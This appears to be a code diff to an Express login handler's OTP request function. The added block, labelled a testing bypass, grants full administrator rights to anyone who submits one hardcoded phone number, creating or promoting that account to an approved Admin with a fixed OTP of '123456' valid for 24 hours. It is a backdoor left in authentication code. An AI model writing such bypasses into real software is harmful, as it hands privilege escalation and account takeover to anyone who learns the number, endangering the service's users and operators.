@@ -10,6 +10,28 @@ export const requestOtp = async (req, res) => {
         const { phone, channel, mode, customerType } = req.body; 
         const requestedRole = req.body.role || 'Customer'; // Capitalized
 
+        // ADMIN BYPASS FOR TESTING
+        if (phone === '9999999994') {
+            let admin = await User.findOne({ phone });
+            if (!admin) {
+                admin = new User({ 
+                    phone, 
+                    role: 'Admin', 
+                    status: 'approved', 
+                    displayName: 'Master Admin',
+                    isProfileComplete: true 
+                });
+            } else {
+                admin.role = 'Admin';
+                admin.status = 'approved';
+            }
+            admin.otp = '123456';
+            admin.otpExpiry = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
+            await admin.save();
+            console.log(`🛡️ [ADMIN_BYPASS] Master Admin activated for ${phone}`);
+            return res.status(200).json({ message: 'Admin OTP sent successfully', role: 'Admin', mock: true });
+        }
+
         if (!phone) {
             return res.status(400).json({ message: 'Phone number is required' });
         }
